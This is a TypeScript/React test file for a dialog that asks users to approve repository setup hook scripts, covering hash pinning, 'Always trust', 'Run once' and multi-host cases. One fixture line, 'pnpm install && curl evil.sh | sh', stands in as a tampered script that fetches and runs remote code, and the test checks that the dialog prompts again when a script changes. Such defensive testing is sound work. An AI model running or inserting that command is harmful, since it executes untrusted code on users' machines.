// @vitest-environment happy-dom

import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import OrcaYamlTrustDialog from './OrcaYamlTrustDialog'
import { useAppStore } from '@/store'
import {
  __resetTrustPromptChainForTests,
  confirmCreatedWorktreeSetupContent,
  ensureHooksApproved,
  ensureHooksConfirmed
} from '@/runtime/repo-hooks/ensure-hooks-confirmed'
import {
  approveAutomationSetup,
  reviewAutomationSkippedSetup
} from '../../../automations/authoring/automation-setup-review'
import type { Repo } from '../../../../../../shared/repository/repo-types'

const hooksCheck = vi.fn()
const uiSet = vi.fn<(updates: unknown) => Promise<void>>()

function makeRepo(executionHostId: Repo['executionHostId']): Repo {
  return {
    id: 'repo-1',
    path: '/repo',
    displayName: 'Repo One',
    badgeColor: '#000000',
    addedAt: 1,
    executionHostId
  }
}

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true
  hooksCheck.mockReset()
  uiSet.mockReset().mockResolvedValue(undefined)
  Object.assign(window, { api: { hooks: { check: hooksCheck }, ui: { set: uiSet } } })
  __resetTrustPromptChainForTests()
  useAppStore.setState({ trustedOrcaHooks: {}, activeModal: 'none', modalData: {} })
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
  act(() => {
    root.render(<OrcaYamlTrustDialog />)
  })
})

afterEach(() => {
  act(() => {
    root.unmount()
  })
  container.remove()
  document.body.innerHTML = ''
})

function serveSetupScript(script: string): void {
  hooksCheck.mockResolvedValue({
    hasHooks: true,
    hooks: { scripts: { setup: script } },
    mayNeedUpdate: false
  })
}

function confirmSetup(): Promise<'run' | 'skip'> {
  return ensureHooksConfirmed(() => useAppStore.getState(), 'repo-1', 'setup', 'local')
}

async function waitForPrompt(): Promise<void> {
  await vi.waitFor(() => {
    expect(useAppStore.getState().activeModal).toBe('confirm-orca-yaml-hooks')
    expect(document.body.querySelector('[role="dialog"]')).not.toBeNull()
  })
}

function clickButton(label: string): void {
  const button = Array.from(document.body.querySelectorAll('button')).find(
    (candidate) => candidate.textContent === label
  )
  expect(button).toBeDefined()
  act(() => {
    button?.click()
  })
}

async function approveWithAlwaysTrust(): Promise<void> {
  await waitForPrompt()
  clickButton('Always trust')
}

describe('OrcaYamlTrustDialog repo on two hosts', () => {
  it('keeps the approved script hash and offers no repo-wide trust', async () => {
    useAppStore.setState({ repos: [makeRepo('local'), makeRepo('runtime:vm-1')] })
    serveSetupScript('pnpm install')

    const first = confirmSetup()
    await waitForPrompt()
    expect(
      Array.from(document.body.querySelectorAll('button')).some(
        (button) => button.textContent === 'Always trust'
      )
    ).toBe(false)
    clickButton('Run hooks')
    await expect(first).resolves.toBe('run')

    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
      setup: {
        contentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90',
        approvedAt: expect.any(Number)
      }
    })

    await expect(confirmSetup()).resolves.toBe('run')
    expect(useAppStore.getState().activeModal).toBe('none')

    serveSetupScript('pnpm install && curl evil.sh | sh')
    const edited = confirmSetup()
    await waitForPrompt()
    clickButton("Don't run")
    await expect(edited).resolves.toBe('skip')
  })
})

describe('OrcaYamlTrustDialog repo approval', () => {
  it('runs once with the shown hash and stores no approval, including after a mismatch', async () => {
    useAppStore.setState({ repos: [makeRepo('local')] })
    serveSetupScript('pnpm install')
    const first = ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
    await waitForPrompt()
    clickButton('Run once')
    await expect(first).resolves.toEqual({
      decision: 'run',
      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
    })
    expect(useAppStore.getState().trustedOrcaHooks).toEqual({})

    const review = confirmCreatedWorktreeSetupContent(
      useAppStore.getState,
      'repo-1',
      'pnpm install && pnpm build',
      'local'
    )
    await waitForPrompt()
    clickButton('Run once')
    await expect(review).resolves.toEqual({
      decision: 'run',
      approvedContentHash: 'e7e22ff042aa9e982d7cc5d39b5f8980822c0aef1f3f9edb76d8da4691e4f2cb'
    })
    expect(useAppStore.getState().trustedOrcaHooks).toEqual({})
    const again = confirmSetup()
    await waitForPrompt()
    clickButton("Don't run")
    await expect(again).resolves.toBe('skip')
  })

  it('always trusts future content and other hook kinds without sending a hash', async () => {
    useAppStore.setState({ repos: [makeRepo('local')] })
    serveSetupScript('pnpm install')
    const first = ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
    await approveWithAlwaysTrust()
    await expect(first).resolves.toEqual({ decision: 'run' })
    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
      all: { approvedAt: expect.any(Number) }
    })
    serveSetupScript('pnpm build')
    await expect(
      ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
    ).resolves.toEqual({ decision: 'run' })
    await expect(
      ensureHooksApproved(useAppStore.getState, 'repo-1', 'archive', 'local')
    ).resolves.toEqual({ decision: 'run' })
    expect(useAppStore.getState().activeModal).toBe('none')
  })

  it('counts an existing approval for another hook as repo trust, but not for VM creates', async () => {
    useAppStore.setState({
      repos: [makeRepo('local')],
      trustedOrcaHooks: { 'repo-1': { archive: { contentHash: 'old-archive', approvedAt: 1 } } }
    })
    serveSetupScript('pnpm install')
    await expect(
      ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
    ).resolves.toEqual({ decision: 'run' })
    const vm = ensureHooksApproved(
      useAppStore.getState,
      'repo-1',
      'setup',
      'local',
      undefined,
      undefined,
      undefined,
      undefined,
      'vm'
    )
    await waitForPrompt()
    clickButton('Run hooks')
    await expect(vm).resolves.toEqual({
      decision: 'run',
      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
    })
    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash).toBe(
      '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
    )
    const changedVm = confirmCreatedWorktreeSetupContent(
      useAppStore.getState,
      'repo-1',
      'pnpm build',
      'local',
      'created-branch',
      'vm'
    )
    await waitForPrompt()
    clickButton('Run hooks')
    await expect(changedVm).resolves.toEqual({
      decision: 'run',
      approvedContentHash: '702e948d947e109310cb2bf19c157b5bb8142b88c87e02ae87a7594c9b797893'
    })
  })
})

describe('automation setup approval', () => {
  it('saves repo trust for future runs and returns no pinned hash', async () => {
    useAppStore.setState({ repos: [makeRepo('local')] })
    serveSetupScript('pnpm install')
    const approval = approveAutomationSetup('repo-1', 'local', 'origin/main')
    await waitForPrompt()
    clickButton('Always trust')
    await expect(approval).resolves.toEqual({ decision: 'run' })
    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
      all: { approvedAt: expect.any(Number) }
    })
  })

  it('clears an old automation hash when its skipped setup is approved', async () => {
    useAppStore.setState({ repos: [makeRepo('local')] })
    const save = vi.fn<(hash: string | undefined) => Promise<boolean>>().mockResolvedValue(true)
    const review = reviewAutomationSkippedSetup(
      { projectId: 'repo-1' },
      {
        scriptContent: 'pnpm install',
        contentHash: 'old-version'
      },
      save
    )
    await approveWithAlwaysTrust()
    await review
    expect(save).toHaveBeenCalledWith(undefined)
    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
      all: { approvedAt: expect.any(Number) }
    })
  })

  it('retains pinned approval when the automation repo is on two hosts', async () => {
    useAppStore.setState({ repos: [makeRepo('local'), makeRepo('runtime:vm-1')] })
    serveSetupScript('pnpm install')
    const approval = approveAutomationSetup('repo-1', 'local', 'origin/main')
    await waitForPrompt()
    clickButton('Run hooks')
    await expect(approval).resolves.toEqual({
      decision: 'run',
      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
    })
    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash).toBe(
      '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
    )
  })
})
